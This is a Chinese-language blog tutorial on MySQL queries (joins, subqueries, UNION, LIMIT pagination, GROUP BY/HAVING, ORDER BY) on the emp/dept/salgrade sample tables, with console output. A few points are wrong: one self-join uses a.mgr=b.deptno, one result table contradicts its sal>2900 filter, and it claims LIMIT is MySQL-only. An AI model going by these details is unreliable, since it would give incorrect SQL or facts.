<p>mysql&gt; <strong>select ename,dname from emp,dept;</strong>//ename和dname要联合起来一块显示，黏到一块。<br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | ACCOUNTING |<br>| SMITH  | RESEARCH   |<br>| SMITH  | SALES      |<br>| SMITH  | OPERATIONS |<br>| ALLEN  | ACCOUNTING |<br>| ALLEN  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| ALLEN  | OPERATIONS |<br>| WARD   | ACCOUNTING |<br>| WARD   | RESEARCH   |<br>| WARD   | SALES      |<br>| WARD   | OPERATIONS |<br>| JONES  | ACCOUNTING |<br>| JONES  | RESEARCH   |<br>| JONES  | SALES      |<br>| JONES  | OPERATIONS |<br>| MARTIN | ACCOUNTING |<br>| MARTIN | RESEARCH   |<br>| MARTIN | SALES      |<br>| MARTIN | OPERATIONS |<br>| BLAKE  | ACCOUNTING |<br>| BLAKE  | RESEARCH   |<br>| BLAKE  | SALES      |<br>| BLAKE  | OPERATIONS |<br>| CLARK  | ACCOUNTING |<br>| CLARK  | RESEARCH   |<br>| CLARK  | SALES      |<br>| CLARK  | OPERATIONS |<br>| SCOTT  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| SCOTT  | SALES      |<br>| SCOTT  | OPERATIONS |<br>| KING   | ACCOUNTING |<br>| KING   | RESEARCH   |<br>| KING   | SALES      |<br>| KING   | OPERATIONS |<br>| TURNER | ACCOUNTING |<br>| TURNER | RESEARCH   |<br>| TURNER | SALES      |<br>| TURNER | OPERATIONS |<br>| ADAMS  | ACCOUNTING |<br>| ADAMS  | RESEARCH   |<br>| ADAMS  | SALES      |<br>| ADAMS  | OPERATIONS |<br>| JAMES  | ACCOUNTING |<br>| JAMES  | RESEARCH   |<br>| JAMES  | SALES      |<br>| JAMES  | OPERATIONS |<br>| FORD   | ACCOUNTING |<br>| FORD   | RESEARCH   |<br>| FORD   | SALES      |<br>| FORD   | OPERATIONS |<br>| MILLER | ACCOUNTING |<br>| MILLER | RESEARCH   |<br>| MILLER | SALES      |<br>| MILLER | OPERATIONS |<br>+——–+————+<br>56 rows in set (0.00 sec)</p>
</blockquote>
<p><strong>笛卡尔积现象：当两张表进行连接查询的时候，没有任何条件进行限制，最终的查询结果条数两张表记录条数的乘积。</strong></p>
<p><strong>关于表的别名：</strong></p>
<p>　select e.ename, d.dname from emp e, dept d;</p>
<p><strong>表的别名有什么好处</strong></p>
<p>　<strong>第一：执行效率高</strong><br>　<strong>第二：可读性好</strong></p>
<h2 id="怎么避免笛卡尔积现象？"><a href="#怎么避免笛卡尔积现象？" class="headerlink" title="怎么避免笛卡尔积现象？"></a>怎么避免笛卡尔积现象？</h2><p><strong>思考：避免了笛卡尔积现象，会减少记录的匹配次数吗？</strong></p>
<blockquote>
<p>不会，次数还是56此。只不过显示的是有效记录</p>
</blockquote>
<p>案例：找出每一个员工的部门名称，要求显示员工名和部门名。</p>
<blockquote>
<p>mysql&gt; select e.ename,d.dname from emp e, dept d where e.deptno=d.deptno;<br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>+——–+————+<br>14 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="内连接之等值连接"><a href="#内连接之等值连接" class="headerlink" title="内连接之等值连接"></a>内连接之等值连接</h2><p><strong>特点：条件是等量关系</strong></p>
<p>案例：查询每个员工的部门名称，要求显示员工名和部门名</p>
<blockquote>
<p><strong>SQL92:(太老，不用了)</strong><br>select e.ename, d.dname from emp e, dept d where e.deptno = d.deptno;</p>
</blockquote>
<blockquote>
<p><strong>SQL99:(常用的)</strong><br>select<br>e.ename, d.dname<br>from<br>emp e<br>join<br>dept d<br><strong>on **<br>**e.deptno = d.deptno;    //等值连接</strong></p>
<p>select<br>e.ename, d.dname<br>from<br>emp e<br>inner join   // inner可省略<br>dept d<br><strong>on **<br>**e.deptno = d.deptno;    //等值连接</strong></p>
</blockquote>
<p>SQL99语法结构更清晰一些：表的连接条件和后来的where条件分离了</p>
<h2 id="内连接之非等值连接"><a href="#内连接之非等值连接" class="headerlink" title="内连接之非等值连接"></a>内连接之非等值连接</h2><p><strong>最大的特点是：连接条件中的关系是非等量关系。</strong></p>
<blockquote>
<p>案例：找出每个员工的工资等级，要求显示员工名、工资、工资等级。<br>select<br>e.ename, e.sal, s.grade<br>from<br>emp e<br>join salgrade s<br>on<br>e.sal&gt;=losal and e.sal&lt;=hisal;</p>
<p>+——–+———+——-+<br>| ename  | sal     | grade |<br>+——–+———+——-+<br>| SMITH  |  800.00 |     1 |<br>| ALLEN  | 1600.00 |     3 |<br>| WARD   | 1250.00 |     2 |<br>| JONES  | 2975.00 |     4 |<br>| MARTIN | 1250.00 |     2 |<br>| BLAKE  | 2850.00 |     4 |<br>| CLARK  | 2450.00 |     4 |<br>| SCOTT  | 3000.00 |     4 |<br>| KING   | 5000.00 |     5 |<br>| TURNER | 1500.00 |     3 |<br>| ADAMS  | 1100.00 |     1 |<br>| JAMES  |  950.00 |     1 |<br>| FORD   | 3000.00 |     4 |<br>| MILLER | 1300.00 |     2 |<br>+——–+———+——-+<br>14 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="内连接之自连接"><a href="#内连接之自连接" class="headerlink" title="内连接之自连接"></a>内连接之自连接</h2><p><strong>最大的特点：一张表看做两张表。自己连接自己。</strong></p>
<p><strong>案例:找出每个员工的上级领导，要求显示员工名和对应的领导名。</strong></p>
<blockquote>
<p>select<br>  a.ename, b.ename<br>from<br>  emp a<br>inner join<br>  emp b<br>on<br>  a.mgr=b.deptno; </p>
</blockquote>
<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p>什么是外连接，和内连接有什么区别？<br>　　内连接：假设A和B表进行连接，使用内连接的话，凡是A表和B表能够匹配上的记录查询出来，这就是内连接。<br>AB两张表没有主副之分，两张表是平等的。</p>
<p>　　外连接：假设A和B表进行连接，使用外连接的话，AB两张表中有一张表是主表，一张表是副表，主要查询主表中的数据，捎带着查询副表，当副表中的数据没有和主表中的数据匹配上，副表自动模拟出NULL与之匹配。</p>
<p>　　外连接的分类？</p>
<p>左外连接（左连接）：表示左边的这张表是主表。<br>右外连接（右连接）：表示右边的这张表是主表。</p>
<p>　　左连接有有连接的写法，右连接也会有对应左连接的写法    </p>
<p><strong>案例：找出每个员工的上级领导？</strong>（所有员工必须全部查询出来）</p>
<blockquote>
<p>//inner可以省略</p>
<p><strong>内连接</strong><br><strong>select a.ename, b.ename from emp a inner join emp b on a.mgr=b.empno;</strong></p>
<p>//outer可以省略</p>
<p><strong>外连接（左连接）</strong><br><strong>select a.ename, b.ename from emp a left outer join emp b on a.mgr=b.empno;</strong></p>
<p><strong>外连接（右连接）</strong></p>
<p><strong>select a.ename, b.ename from emp b right outer join emp a on a.mgr=b.empno;</strong></p>
</blockquote>
<p><strong>外连接重要的特点是：主表的数据无条件的全部查询出来</strong></p>
<p><strong>案例：找出那个部门没有员工？</strong></p>
<blockquote>
<p>mysql&gt; <strong>select d.* from emp e right join dept d on e.deptno=d.deptno where e.empno is null;</strong><br>+——–+————+——–+<br>| DEPTNO | DNAME      | LOC    |<br>+——–+————+——–+<br>|     40 | OPERATIONS | BOSTON |<br>+——–+————+——–+<br>1 row in set (0.00 sec)</p>
</blockquote>
<h2 id="三张表怎么连接查询？"><a href="#三张表怎么连接查询？" class="headerlink" title="三张表怎么连接查询？"></a>三张表怎么连接查询？</h2><p>案例：找出每一个员工的部门名称以及工资等级</p>
<blockquote>
<p>//全部员工<br>select * from emp;<br>//部门名称<br>select e.ename, d.dname from emp e join dept d on e.deptno=d.deptno;<br>//工资等级<br>select e.ename, s.grade from emp e join salgrade s on e.sal between losal and hisal;<br>//最终结合<br>select e.ename, d.dname, s.grade from emp e join dept d on  e.deptno=d.deptno join salgrade s on e.sal between losal and hisal;</p>
</blockquote>
<p><strong>案例：找出每个员工的部门名称、工资等级、以及上级领导。</strong></p>
<blockquote>
<p>select e.ename, d.dname, s.grade,b.ename from emp e join dept d on  e.deptno=d.deptno join salgrade s on e.sal between losal and hisal join emp b on e.mgr=b.empno;</p>
</blockquote>
<h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><h2 id="什么是子查询？子查询都可以出现在哪里？"><a href="#什么是子查询？子查询都可以出现在哪里？" class="headerlink" title="什么是子查询？子查询都可以出现在哪里？"></a><strong>什么是子查询？子查询都可以出现在哪里？</strong></h2><p>　<strong>select 语句当中嵌套select语句，被嵌套的select语句是子查询</strong></p>
<p>　<strong>子查询可以出现在哪里?</strong></p>
<p>　<strong>select</strong><br>　　<strong>..(select)</strong></p>
<p>　<strong>from</strong><br>　　<strong>..(select)</strong></p>
<p>　<strong>where</strong></p>
<p>　　<strong>..(select)</strong></p>
<h2 id="where子句中使用子查询"><a href="#where子句中使用子查询" class="headerlink" title="where子句中使用子查询"></a>where子句中使用子查询</h2><p><strong>案例：找出高于平均薪资的员工信息。</strong></p>
<blockquote>
<p>select * from emp where sal &gt; (select avg(sal) from emp);</p>
</blockquote>
<h2 id="From后面嵌套子查询"><a href="#From后面嵌套子查询" class="headerlink" title="From后面嵌套子查询"></a>From后面嵌套子查询</h2><p><strong>案例：找出每个部门平均薪水的薪资等级</strong></p>
<blockquote>
<p><strong>First Step:</strong><br><strong>select avg(sal) avg, deptno from emp group by deptno;</strong></p>
<p>+————-+——–+<br>| avg         | deptno |<br>+————-+——–+<br>| 2916.666667 |     10 |<br>| 2175.000000 |     20 |<br>| 1566.666667 |     30 |<br>+————-+——–+<br>3 rows in set (0.00 sec)</p>
<p><strong>Second Step:</strong><br><strong>select n.avg, n.deptno, s.grade from (select avg(sal) avg, deptno from emp group by deptno) n join salgrade s on n.avg between losal and hisal;</strong></p>
<p>+————-+——–+——-+<br>| avg         | deptno | grade |<br>+————-+——–+——-+<br>| 2916.666667 |     10 |     4 |<br>| 2175.000000 |     20 |     4 |<br>| 1566.666667 |     30 |     3 |<br>+————-+——–+——-+<br>3 rows in set (0.01 sec)</p>
</blockquote>
<p>案例：找出每个部门平均的薪水等级 </p>
<blockquote>
<p><strong>First Step:</strong><br><strong>select e.deptno, s.grade from emp e join salgrade s on e.sal between losal and hisal;</strong></p>
<p>+——–+——-+<br>| deptno | grade |<br>+——–+——-+<br>|     20 |     1 |<br>|     30 |     3 |<br>|     30 |     2 |<br>|     20 |     4 |<br>|     30 |     2 |<br>|     30 |     4 |<br>|     10 |     4 |<br>|     20 |     4 |<br>|     10 |     5 |<br>|     30 |     3 |<br>|     20 |     1 |<br>|     30 |     1 |<br>|     20 |     4 |<br>|     10 |     2 |<br>+——–+——-+<br>14 rows in set (0.00 sec)</p>
<p><strong>Second Step:</strong><br><strong>select s.deptno, avg(s.grade) avg from (select e.deptno, s.grade from emp e join salgrade s on e.sal between losal and hisal) s group by s.deptno;</strong><br>+——–+——–+<br>| deptno | avg    |<br>+——–+——–+<br>|     10 | 3.6667 |<br>|     20 | 2.8000 |<br>|     30 | 2.5000 |<br>+——–+——–+<br>3 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="在select后面嵌套子查询"><a href="#在select后面嵌套子查询" class="headerlink" title="在select后面嵌套子查询"></a>在select后面嵌套子查询</h2><p><strong>案例：找出每个员工所在的部门名称，要求显示员工名和部门名。</strong></p>
<blockquote>
<p><strong>select e.ename, (select d.dname from dept d where e.deptno=d.deptno) dname from emp e;</strong><br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>+——–+————+</p>
</blockquote>
<h1 id="union-可以将查询结果集相加"><a href="#union-可以将查询结果集相加" class="headerlink" title="union(可以将查询结果集相加)"></a>union(可以将查询结果集相加)</h1><p><strong>案例：找出工作岗位是SALESMAN和MANAGER的员工</strong></p>
<blockquote>
<p><strong>mysql&gt; select * from emp where job=’salesman’ or job=’manager’;</strong><br>+——-+——–+———-+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB      | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———-+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER  | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER  | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER  | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |</p>
</blockquote>
<blockquote>
<p><strong>First Step:</strong></p>
<p>select * from emp where job=’salesman’ or job=’manager’;</p>
<p><strong>Second Step:</strong><br>select * from emp where job in(‘salesman’ ,’manager’) ;</p>
<p><strong>Third Step: union</strong><br> select * from emp where job=’salesman’<br> union<br> select * from emp where job=’manager’;</p>
<p>+——-+——–+———-+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB      | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———-+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7844 | TURNER | SALESMAN | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7566 | JONES  | MANAGER  | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7698 | BLAKE  | MANAGER  | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER  | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>+——-+——–+———-+——+————+———+———+——–+</p>
</blockquote>
<p>两张不相干的表中的数据拼接在一起显示？<br>select ename from emp<br> union<br> select dname from dept;</p>
<blockquote>
<p>mysql&gt; select ename from emp  union select dname from dept;<br>+————+<br>| ename      |<br>+————+<br>| SMITH      |<br>| ALLEN      |<br>| WARD       |<br>| JONES      |<br>| MARTIN     |<br>| BLAKE      |<br>| CLARK      |<br>| SCOTT      |<br>| KING       |<br>| TURNER     |<br>| ADAMS      |<br>| JAMES      |<br>| FORD       |<br>| MILLER     |<br>| ACCOUNTING |<br>| RESEARCH   |<br>| SALES      |<br>| OPERATIONS |<br>+————+</p>
</blockquote>
<h1 id="Limit-重点中的重点"><a href="#Limit-重点中的重点" class="headerlink" title="Limit(重点中的重点)"></a>Limit(重点中的重点)</h1><p><strong>特点：以后分页查询全靠它</strong></p>
<p><strong>Limit是mysql特有的，其他数据库中没有，不通用（oracle有一个相同的机制，叫做rownum）.</strong></p>
<p><strong>limit取结果几种的部分数据，这时它的作用。</strong></p>
<blockquote>
<p><strong>语法机制：</strong></p>
<p>　　 <strong>limit startIndex, length</strong></p>
<p>　　<strong>startIndex表示起始位置</strong></p>
<p>　　<strong>length表示取几个</strong></p>
</blockquote>
<p><strong>案例：取出工资前五名的员工（思路：降序取前5个）</strong></p>
<blockquote>
<p><strong>mysql&gt; select ename,sal from emp order by sal desc limit 0,5;</strong><br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+<br>5 rows in set (0.00 sec)</p>
<p><strong>mysql&gt; select ename,sal from emp order by sal desc limit 5;</strong><br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+</p>
</blockquote>
<p><strong>limit是sql语句最后执行的一个环节</strong>：</p>
<p>select   5<br>from  1<br>where  2<br>group by   3<br>having    4<br>order by   6<br>limit   7</p>
<p>案例：找出工资排名在第4到第9名的员工？</p>
<blockquote>
<p>select ename,sal from emp order by sal desc limit 3,6;</p>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |</p>
</blockquote>
<p><strong>通用的标准分页sql?</strong></p>
<p>每页显示3条记录：<br>第一页： 0, 3<br>第二页： 3, 3<br>第三页： 6, 3</p>
<p><strong>每页显示pagesize条记录：</strong><br><strong>第pageNo页： pageSize*(pageNO-1)， pagesize</strong></p>
<p>pageSize是什么？是每页显示多少条记录<br>pageNo是什么？显示第几页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java代码&#123;</span><br><span class="line"></span><br><span class="line">​		int pageNo &#x3D; 2; &#x2F;&#x2F;</span><br><span class="line">​        int page size &#x3D; 10;</span><br><span class="line">​      limit (pageNo - 1)*pagesize , pagesize</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>分组查询 Group By</title>
    <url>/2020/10/04/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%20Group%20By/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="group-by-和-having"><a href="#group-by-和-having" class="headerlink" title="group by 和 having"></a>group by 和 having</h1><p><strong>group by</strong> ：按照某个字段或者某些字段进行分组。<br><strong>having</strong> ：是对分组之后的数据进行再次过滤。</p>
<p>案例：找出每个工作岗位的最高薪资。<br>select max(sal),job from emp group by job;</p>
<p><strong>注意</strong>：分组函数一般都会和group by 联合使用，这也是为什么它被称作分组函数的原因，并且任何一个分组函数（count sum avg max min）都是在group by 语句执行结束之后才会执行。当一条sql语句没有group by 的话。整张表的数据会自成一组。（group by 是在where执行之后才会执行的。）</p>
<p>找出工资高于平均工资的员工。<br> select ename,sal from emp where sal&gt;(select avg(sal) from emp);</p>
<p> select ename,max(sal),job from emp group by job;<br>以上在mysql当中，查询结果是有的，但是结果没有意义。在oracle数据库中会报语法错误。oracle的语法规则比mysql语法规则严谨。<br>记住一个规则当一条语句中有group by的话，select后面只能跟分组函数和参与分组的字段。</p>
<p><strong>每个工作岗位的平均薪资</strong></p>
<p>select avg(sal),job from emp group by job;</p>
<p>+————-+———–+<br>| avg(sal)    | job       |<br>+————-+———–+<br>| 3000.000000 | ANALYST   |<br>| 1037.500000 | CLERK     |<br>| 2758.333333 | MANAGER   |<br>| 5000.000000 | PRESIDENT |<br>| 1400.000000 | SALESMAN  |</p>
<p>多个字段能不能联合起来一块分组？</p>
<p><strong>找出每个部门不同工作岗位的最高薪资。</strong><br>select<br>    deptno,job,max(sal)<br>from<br>    emp<br>group by<br>    deptno,job;</p>
<p>+——–+———–+———-+<br>| deptno | job       | max(sal) |<br>+——–+———–+———-+<br>|     10 | CLERK     |  1300.00 |<br>|     10 | MANAGER   |  2450.00 |<br>|     10 | PRESIDENT |  5000.00 |<br>|     20 | ANALYST   |  3000.00 |<br>|     20 | CLERK     |  1100.00 |<br>|     20 | MANAGER   |  2975.00 |<br>|     30 | CLERK     |   950.00 |<br>|     30 | MANAGER   |  2850.00 |<br>|     30 | SALESMAN  |  1600.00 |<br>+——–+———–+———-+<br>9 rows in set (0.00 sec)</p>
<p><strong>找出每个部门的最高薪资，要求显示薪资大于2900的数据。</strong><br>第一步：每个部门的最高薪资<br>select deptno,max(sal) from emp group by deptno;</p>
<p>+——–+———-+<br>| deptno | max(sal) |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |</p>
<p>第二步：薪资大于2900的数据<br>select * from emp where sal&gt;2900;</p>
<p>+——-+——-+———–+——+————+———+——+——–+<br>| EMPNO | ENAME | JOB       | MGR  | HIREDATE   | SAL     | COMM | DEPTNO |<br>+——-+——-+———–+——+————+———+——+——–+<br>|  7566 | JONES | MANAGER   | 7839 | 1981-04-02 | 2975.00 | NULL |     20 |<br>|  7698 | BLAKE | MANAGER   | 7839 | 1981-05-01 | 2850.00 | NULL |     30 |<br>|  7788 | SCOTT | ANALYST   | 7566 | 1987-04-19 | 3000.00 | NULL |     20 |<br>|  7839 | KING  | PRESIDENT | NULL | 1981-11-17 | 5000.00 | NULL |     10 |<br>|  7902 | FORD  | ANALYST   | 7566 | 1981-12-03 | 3000.00 | NULL |     20 |<br>+——-+——-+———–+——+————+———+——+——–+</p>
<p><strong>最后合并</strong></p>
<p>select deptno,max(sal) from emp where sal&gt;2900 group by deptno;</p>
<p>+——–+———-+<br>| deptno | max(sal) |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>+——–+———-+<br>2 rows in set (0.00 sec)</p>
<p><strong>找出每个部门的平均薪资，要求显示薪资大于2000的数据。</strong><br>第一步：<br>select deptno,avg(sal) 平均薪资 from emp group by deptno;</p>
<p>+——–+————-+<br>| deptno | 平均薪资    |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |</p>
<p>第二步：<br>select deptno,avg(sal) 平均薪资 from emp group by deptno having 平均薪资&gt;2000;</p>
<p>+——–+————-+<br>| deptno | 平均薪资    |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>+——–+————-+</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个完整的DQL语句怎么写?</p>
<p>select 5<br>    ··<br>from 1<br>    ··<br>where 2<br>    ··<br>group by 3<br>    ··<br>having 4<br>    ··<br>order by 6<br>    ··</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql表的结构</title>
    <url>/2020/09/21/MySql%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="表的结构"><a href="#表的结构" class="headerlink" title="表的结构"></a>表的结构</h1><blockquote>
<p>+——————-+<br>| Tables_in_dongjun |<br>+——————-+<br>| dept              |   （部门表）<br>| emp               |   （员工表）<br>| salgrade          |   （工资等级表）</p>
</blockquote>
<blockquote>
<p>表的结构mysql&gt; desc dept;<br>+——–+————-+——+—–+———+——-+<br>| Field  | Type        | Null | Key | Default | Extra |<br>+——–+————-+——+—–+———+——-+<br>| DEPTNO | int(2)      | NO   | PRI | NULL    |       |<br>| DNAME  | varchar(14) | YES  |     | NULL    |       |<br>| LOC    | varchar(13) | YES  |     | NULL    |       |<br>+——–+————-+——+—–+———+——-+</p>
</blockquote>
<p>表中的数据</p>
<blockquote>
<p>mysql&gt; select * from emp;<br>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<h1 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h1><p>（略）</p>
<h1 id="排序（升序、降序）"><a href="#排序（升序、降序）" class="headerlink" title="排序（升序、降序）"></a>排序（升序、降序）</h1><p>题目：按照工资升序排序，找出员工名和薪资。<br>select ename, sal from emp order by sal;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |</p>
</blockquote>
<p><strong>注意：默认是升序asc表示升序、desc表示降序</strong>  </p>
<p>select ename, sal from emp order by sal;<br>select ename, sal from emp order by sal asc; 指定升序<br>select ename, sal from emp order by sal desc; 指定降序</p>
<p>题目：按照工资的降序排列，当工资相同的时候再按照名字的升序排列。</p>
<p>select ename,sal from emp order by sal desc , ename asc;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| KING   | 5000.00 |<br>| FORD   | 3000.00 |<br>| SCOTT  | 3000.00 |<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| MARTIN | 1250.00 |<br>| WARD   | 1250.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| SMITH  |  800.00 |<br>+——–+———+</p>
</blockquote>
<p><strong>注意</strong>：越靠前的字段越能起到主导作用。只有当前面的字段无法完成排序的时候后，才会启用后面的字段。</p>
<p>select ename, sal from emp order by 2;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
<p><strong>注意：</strong>“2”代表的是第几列。</p>
<p><strong>select * from emp order by 6;</strong></p>
<p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 